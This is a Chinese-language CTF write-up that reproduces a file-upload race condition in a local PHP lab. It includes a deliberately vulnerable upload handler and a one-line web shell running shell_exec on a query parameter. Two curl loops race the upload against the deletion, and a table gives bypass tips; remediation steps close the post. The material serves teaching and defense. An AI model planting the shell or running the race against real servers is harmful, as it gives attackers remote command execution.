---
title: "文件上传条件竞争"
slug: "ctf-upload-race-condition"
date: 2026-08-29T10:51:17+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "利用「检测通过 → 删除之前」的时间差，在上传文件被删前访问并执行。"
summary: "利用「检测通过 → 删除之前」的时间差，在上传文件被删前访问并执行。"
tags: ["CTF", "文件上传", "条件竞争"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 3
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/3.条件竞争解法(面对文件上传).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-upload-race-condition/workflow.svg" alt="文件通过检查后、被删除前存在短暂可执行窗口。" loading="lazy">
  <figcaption>图 1 · 上传条件竞争时间窗。文件通过检查后、被删除前存在短暂可执行窗口。</figcaption>
</figure>

## 1. 本地复现环境

创建 `/tmp/race-lab`：

```bash
mkdir -p /tmp/race-lab/uploads
cd /tmp/race-lab
```

创建 `index.php`：

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $name = basename($_FILES['file']['name']);
    $target = __DIR__ . '/uploads/' . $name;
    move_uploaded_file($_FILES['file']['tmp_name'], $target);

    // 模拟“检查期间”的时间窗口
    usleep(500000);

    if (preg_match('/<\?php/i', file_get_contents($target))) {
        unlink($target);
        echo "deleted\n";
        exit;
    }

    echo "kept: /uploads/$name\n";
}
```

创建 `shell.php`：

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

启动：

```bash
php -S 127.0.0.1:8080
```

## 2. 上传并抢访问窗口

终端 A 持续上传：

```bash
while true; do
  curl -sS -F 'file=@/tmp/race-lab/shell.php;filename=shell.php' \
    'http://127.0.0.1:8080/' >/dev/null
done
```

终端 B 持续访问：

```bash
while true; do
  curl -sS --get --data-urlencode 'cmd=id' \
    'http://127.0.0.1:8080/uploads/shell.php' \
    -o /tmp/race-result.txt
  if grep -q 'uid=' /tmp/race-result.txt; then
    cat /tmp/race-result.txt
    break
  fi
done
```

## 3. 为什么能成功

```text
上传落盘
  → 检查文件内容
  → 检查通过/失败
  → 删除文件
```

如果检查和删除之间有延迟，Web 服务器仍可把文件当成 PHP 解析。竞争的本质是
**在删除之前完成一次有效请求**，不是“多线程一定成功”。

## 4. 提高成功率

- 加大上传文件体积，让落盘/检查更慢；
- 使用多个上传线程和一个访问线程；
- 选稳定的临时文件名；
- 记录每次请求时间，证明访问发生在删除之前；
- 只使用无害命令验证，如 `id` 或 `echo marker`。

## 5. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 一直 404 | 文件名/目录不可预测 | 先从响应或日志找路径 |
| 一直 403 | 上传目录禁止执行 | 组合 `.htaccess` 或其他解析点 |
| 有窗口但来不及 | 删除太快 | 多线程并发、加大文件 |
| 访问到源码 | PHP 未解析 | 改变后缀/解析配置 |

## 6. 修复

- 上传先写入不可执行目录；
- 使用随机文件名；
- 完成校验后再原子移动到公开目录；
- 上传目录关闭脚本执行；
- 删除失败文件由后台任务处理，避免竞态窗口。
